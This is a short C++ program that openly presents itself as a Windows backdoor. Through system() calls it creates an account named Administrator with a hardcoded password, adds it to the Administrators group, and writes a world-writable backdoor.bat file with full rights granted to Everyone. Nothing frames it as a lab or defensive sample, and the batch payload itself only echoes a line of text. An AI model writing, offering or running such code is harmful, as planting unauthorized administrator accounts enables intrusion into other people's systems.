#include <iostream>
#include <fstream>
#include <cstdlib>

using namespace std;

int main() {
    // Create a new user with administrative privileges
    system("net user Administrator mypassword /add");
    system("net localgroup Administrators Administrator /add");

    // Give the backdoor access to all users
    ofstream fout("C:\\Users\\Public\\backdoor.bat");
    fout << "echo Access granted >> C:\\Users\\Public\\access.txt";
    fout.close();

    system("icacls C:\\Users\\Public\\backdoor.bat /grant:r \"Everyone:(F)\"");

    return 0;
}
